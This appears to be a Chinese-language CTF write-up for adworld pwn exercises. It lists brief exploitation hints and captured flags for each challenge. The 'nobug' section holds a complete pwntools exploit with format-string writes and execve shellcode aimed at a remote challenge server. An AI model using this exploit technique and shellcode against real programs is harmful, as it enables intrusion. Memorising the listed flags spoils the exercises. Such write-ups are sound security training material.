## Exercise area

### 001 cgpwn2

#### flag

```text
cyberpeace{e5288e163d543187a604de2afb455c9d}
```

### 002 get_shell

直接nc过去就可以，程序里直接system("/bin/sh")

#### flag

```text
cyberpeace{3219289faefeb90c91424a95c199a523}
```

### 003 CGfsb

格式化字符串，修改pwnme的值为8

#### flag

```text
cyberpeace{674c47d9c0998872d8e28038c83d1a46}
```

### 004 when_did_you_born

直接栈溢出，修改变量值为1926，绕过判断

#### flag

```text
cyberpeace{43a8e2c74c9f03fedf38ceb9edba9f8d}
```

### 005 hello_pwn

直接栈溢出，修改变量值为0x6E756161，绕过判断

#### flag

```text
cyberpeace{8d1bc95165bab24d6675fdb4d4d197ea}
```

### 006 level0

栈溢出，修改ret为callsystem

#### flag

```text
cyberpeace{f748141959a575f9c050ee313bfb0ae0}
```

### 007 level2

直接ROP，程序中有直接`system`调用，程序数据段有`/bin/sh`字符串。

#### flag

```text
cyberpeace{9d43d1ca05244468af2e33c24faa2ba4}
```

### 008 string

#### flag

```text
cyberpeace{8123640afe4ada1339d2f69f2fe0f6a0}
```

### 009 guess_num

程序指定一个seed，连续生成10随机数，与用户的输入对比。
而用户输入的时候name有溢出，可以覆盖seed。

```c
  char v7; // [rsp+10h] [rbp-30h]
  unsigned int seed[2]; // [rsp+30h] [rbp-10h]

  ...

  printf("Your name:", 0LL);
  gets(&v7);
  srand(seed[0]);
  for ( i = 0; i <= 9; ++i )
  {
    v6 = rand() % 6 + 1;
    printf("-------------Turn:%d-------------\n", (unsigned int)(i + 1));
    printf("Please input your guess number:");
    __isoc99_scanf("%d", &v4);
    puts("---------------------------------");
    if ( v4 != v6 )
    {
      puts("GG!");
      exit(1);
    }
    puts("Success!");
  }
```

如果输入10个随机数都正确的话，程序会向下走，然后执行下面的`cat flag`，得到flag

```c
__int64 sub_C3E()
{
  printf("You are a prophet!\nHere is your flag!");
  system("cat flag");
  return 0LL;
}
```

#### flag

```text
cyberpeace{36fa0557da2d5e2fd88548217774b973}
```

### 010 int_overflow

#### flag

```text
cyberpeace{67e0436f6b3f20c76c765823ccceef34}
```

### level3

read有栈溢出，通过ret进行ret2libc

通过read的栈溢出，两次进入main函数，第一次，ret到write_plt, 通过write泄漏libc地址。
第二次，ret到system, 执行system("/bin/sh")。

#### flag

```text
cyberpeace{f130879be25ed3eaa1da0b50b9fcda3d}
```

## Challenge area

### 031 hacknote

UAF，del的时候，没有将指针清零。

#### flag

```text
cyberpeace{9a1efd7acdfe1082a115c97801a758fb}
```

### easyfmt

最基本的format攻击



### nobug

#### 利用

*栈*, *fmtstr*

#### 思路

编译选项，没有NX，可以直接在栈上写shellcode

```text
$ checksec 4f59876cebb1469ca62254c162306aa5
[*] '/Users/seesea/ctf/adworld/pwn/Challenge_area/nobug/4f59876cebb1469ca62254c162306aa5'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

从代码逻辑分析，这是一个`base64`解码程序，对于输入的`base64`字符串解码，然后`snprintf`格式化打印，并输出。从`F5`的代码查看，没有发现问题。

```c
int b64_conv_8048B76()
{
  int v0; // eax
  char *v1; // eax

  v0 = strlen(b64_str);
  v1 = b64_decode_804869D((int)b64_str, v0, 0);
  return snprintf(str_804A8A0, 0x800u, "%s", v1);
}
```

但是从汇编代码上面看，`b64_conv_8048B76`这个函数的结尾有问题，是红的。
分析结尾的地方，`push sub_8048BD1; push sub_8048B32`，然后没有`leave`，直接`ret`了。
所以`sub_8048B32`现在就是ret了。函数返回后，转到`sub_8048B32`。

```nasm
.text:08048B76 b64_conv_8048B76 proc near              ; CODE XREF: process_8048BD4+6↓p
.text:08048B76 ; __unwind {
.text:08048B76                 push    ebp
.text:08048B77                 mov     ebp, esp
.text:08048B79                 sub     esp, 18h
.text:08048B7C                 mov     dword ptr [esp], offset b64_str ; s
.text:08048B83                 call    _strlen
.text:08048B88                 mov     dword ptr [esp+8], 0
.text:08048B90                 mov     [esp+4], eax
.text:08048B94                 mov     dword ptr [esp], offset b64_str
.text:08048B9B                 call    b64_decode_804869D
.text:08048BA0                 mov     [esp+0Ch], eax
.text:08048BA4                 mov     dword ptr [esp+8], offset format ; "%s"
.text:08048BAC                 mov     dword ptr [esp+4], 800h ; maxlen
.text:08048BB4                 mov     dword ptr [esp], offset str_804A8A0 ; s
.text:08048BBB                 call    _snprintf
.text:08048BC0                 push    offset sub_8048BD1
.text:08048BC5                 push    offset sub_8048B32
.text:08048BCA                 push    0
.text:08048BCC                 lea     esp, [esp+4]
.text:08048BD0                 retn
.text:08048BD0 b64_conv_8048B76 endp ; sp-analysis failed
```

`sub_8048B32`函数中，重新做了一次`base64`解码，但是这里解码后的字符串，与前面不同，做为了`snprintf`的`fmt`参数。
所以这里有一个`fmtstr`攻击。

```c
int sub_8048B32()
{
  int v0; // eax
  char *v1; // eax

  v0 = strlen(b64_str);
  v1 = b64_decode_804869D((int)b64_str, v0, 0);
  return snprintf(str_804A8A0, 0x800u, v1);
}
```

由于输入的字符串，和解码后的字符串，都是全局变量，所以不能任意控制栈数据，只能通过epb地址来达到修改任意地址数据目的。
研究`sprintf`前的栈布局，`0x804a8a0`地址为解码后的字符串地址，所以，只要在这里放上`shellcode`，再修改`ret`到这里即可。

```txt
00:0000│ esp  0xffe5d300 —▸ 0x804a8a0 ◂— and    eax, 0x25782434 /* 0x78243425; '%4$x%12$x%20$xdeadbeef' */
01:0004│      0xffe5d304 ◂— 0x800
02:0008│      0xffe5d308 —▸ 0x80d81c0 ◂— '%4$x%12$x%20$xdeadbeef'
03:000c│      0xffe5d30c —▸ 0xf7e14370 (snprintf) ◂— endbr32
04:0010│      0xffe5d310 —▸ 0x80d81a0 ◂— '%4$x%12$x%20$xdeadbeef'
05:0014│      0xffe5d314 ◂— 0x0
06:0018│ ebp  0xffe5d318 —▸ 0xffe5d338 —▸ 0xffe5d358 —▸ 0xffe5d378 ◂— 0x0
07:001c│      0xffe5d31c —▸ 0x8048bd1 ◂— pop    eax
08:0020│      0xffe5d320 —▸ 0x804a8a0 ◂— and    eax, 0x25782434 /* 0x78243425; '%4$x%12$x%20$xdeadbeef' */
09:0024│      0xffe5d324 ◂— 0x800
0a:0028│      0xffe5d328 —▸ 0x8048d00 ◂— and    eax, 0x73 /* '%s' */
0b:002c│      0xffe5d32c —▸ 0x80d81a0 ◂— '%4$x%12$x%20$xdeadbeef'
0c:0030│      0xffe5d330 ◂— 0x0
0d:0034│      0xffe5d334 —▸ 0x804a0c0 ◂— 0
0e:0038│      0xffe5d338 —▸ 0xffe5d358 —▸ 0xffe5d378 ◂— 0x0
0f:003c│      0xffe5d33c —▸ 0x8048bdf ◂— mov    dword ptr [esp], 0x804a8a0
10:0040│      0xffe5d340 —▸ 0xf7fabc80 (_IO_2_1_stderr_) ◂— xchg   dword ptr [eax], esp /* 0xfbad2087 */
11:0044│      0xffe5d344 ◂— 0x0
12:0048│      0xffe5d348 —▸ 0xffe5d3a4 ◂— 0x0
13:004c│      0xffe5d34c ◂— 0x20 /* ' ' */
14:0050│      0xffe5d350 ◂— 0x0
15:0054│      0xffe5d354 ◂— 0x1733c2f1
16:0058│      0xffe5d358 —▸ 0xffe5d378 ◂— 0x0
```

#### exp

```python
#!/usr/bin/env python3
#! -*- coding : utf-8 -*-

import os, sys, base64
from pwn import *
from ctypes import *
from pwnlib.fmtstr import *

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
context.aslr = False

target='./4f59876cebb1469ca62254c162306aa5'
use_gdb = False
use_gdb = True
gdb_script='''
b *0x08048B6F
c
'''

def exp(ip = None, port = None):
    global use_gdb
    remote_run = False
    flag = None
    if ip and port:
        p = remote(ip, port)
        use_gdb = False
        remote_run = True
    else:
        p=process(target)

    if use_gdb:
        gdb.attach(p, gdbscript=gdb_script)
        pause()

    payload = base64.b64encode(b'%4$x%12$x%20$xdeadbeef')
    p.sendline(payload)
    addr = p.recvuntil(b'deadbeef')[:-8]
    ebp = int(addr[0:8], 16)

    ret_addr = ebp + 4
    shell_addr = (0xa8a0 - (ret_addr&0xFF)) & 0xFFFF
    shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69" + \
                b"\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
    payload = shellcode
    if ret_addr&0xFF > 0:
        payload += b'%' + str((ret_addr - len(shellcode))&0xFF).encode() + b'c%4$hhn%' + str(shell_addr).encode() + b'c%12$hn'
    else:
        payload += b'%' + str((ret_addr - len(shellcode))&0xFFFF).encode() + b'c%4$hn%' + str(shell_addr).encode() + b'c%12$hn'

    payload = base64.b64encode(payload)
    p.sendline(payload)
    sleep(2)
    p.recv()
    #p.interactive()
    #p.recvuntil(b'\n')
    if remote_run:
        p.sendline('cat flag')
        flag = p.recvuntil(b'\n')
    else:
        p.interactive()

    log.info(flag)

if __name__ == "__main__":
    ip, port = None, None
    remote_str = None
    remote_str = '220.249.52.133:57787'

    if len(sys.argv) > 1:
        remote_str = sys.argv[1]
    if remote_str:
        ip, port = remote_str.split(":")

    exp(ip, port)
```

### flag

```text
cyberpeace{ed0dc788925f259852d21df4e82b4895}
```


### magic

#### 利用

*FILE struct*

#### 思路

结构体：

```c
struct wizard_t {
    char *name; // malloc(0x18)
    char *desc;
    long var1;
    long var2;
    long var3;
    long mp;
}
```

#### exp

```python
```

### flag

```text
```


### 

#### 思路

#### exp

```python
```

### flag

```text
```


### 

#### 思路

#### exp

```python
```

### flag

```text
```


### 

#### 思路

#### exp

```python
```

### flag

```text
```